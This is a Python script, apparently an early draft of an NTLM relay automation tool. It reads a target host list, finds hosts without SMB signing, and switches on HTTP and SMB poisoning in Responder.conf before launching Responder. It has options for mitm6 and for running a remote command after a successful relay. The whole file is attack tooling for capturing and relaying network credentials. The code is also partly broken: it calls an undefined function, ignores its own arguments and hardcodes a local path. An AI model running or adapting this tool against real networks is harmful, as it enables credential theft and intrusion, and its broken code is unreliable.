#!/usr/bin/env python3

import asyncio
import argparse
import re
import os
import sys
from src.utils import *
from src.smb import get_unsigned_hosts
from src.process import Process
from netaddr import IPNetwork, AddrFormatError

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-i", "--interface", help="Interface to use with Responder")
    parser.add_argument("-c", "--command", help="Remote command to run upon successful NTLM relay")
    parser.add_argument("-6", "--mitm6", action='store_true', help="Run mitm6 in conjunction with the relay attack")
    #parser.add_argument("-p", "--privexchange", action='store_true', help="Remote command to run upon successful NTLM relay")
    return parser.parse_args()

def parse_hostlist(hostlist):
    """
    Parse the hostlist argument

    Mandatory arguments:
    - hostlist : file with list of IPs or CIDR notation blocks
    """
    hosts = []
    with open(hostlist, 'r') as f:
        host_lines = f.readlines()
        for line in host_lines:
            line = line.strip()
            try:
                if '/' in line:
                    hosts += [str(ip) for ip in IPNetwork(line)]
                elif '*' in line:
                    print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24')
                else:
                    hosts.append(line)
            except (OSError, AddrFormatError):
                print_bad('Error importing host list file. Are you sure you chose the right file?')

    return hosts

def edit_resp_conf(switch, protocols, conf):
    """
    Edit Responder.conf

    Mandatory arguments:
    - switch : string of On or Off
    - protocols : the protocols to change, e.g., HTTP, SMB, POP, IMAP
    - conf : the Responder.conf config file location
    """
    if switch == 'On':
        opp_switch = 'Off'
    else:
        opp_switch = 'On'
    with open(conf, 'r') as f:
        filedata = f.read()
    for p in protocols:
        # Make sure the change we're making is necessary
        if re.search(p + ' = ' + opp_switch, filedata):
            filedata = filedata.replace(p + ' = ' + opp_switch, p + ' = ' + switch)
    with open(conf, 'w') as f:
        f.write(filedata)

def start_responder(iface=None):
    if not iface:
        iface = get_iface()
    protocols = ['HTTP', 'SMB']
    switch = 'On'
    edit_responder_conf(switch, protocols)
    cmd = 'python2 {}/submodules/Responder/Responder.py -wrd -I {}'.format(os.getcwd(), iface)
    Responder = Process(cmd)
    resp_proc = Responder.run('logs/Responder.log')
    return Responder

async def main():
    hostlist = '/home/dan/PycharmProjects/autorelayx/nocommit/hostlist.txt'
    hosts = parse_hostlist(hostlist)
    unsigned_hosts = await get_unsigned_hosts(loop, hosts)

    # Start Responder
    Responder = start_responder()

if __name__ == "__main__":

        if os.geteuid():
            print_bad('Run as root')
            sys.exit()

        args = parse_args()
        loop = asyncio.get_event_loop()
        loop.run_until_complete(main())
        loop.close()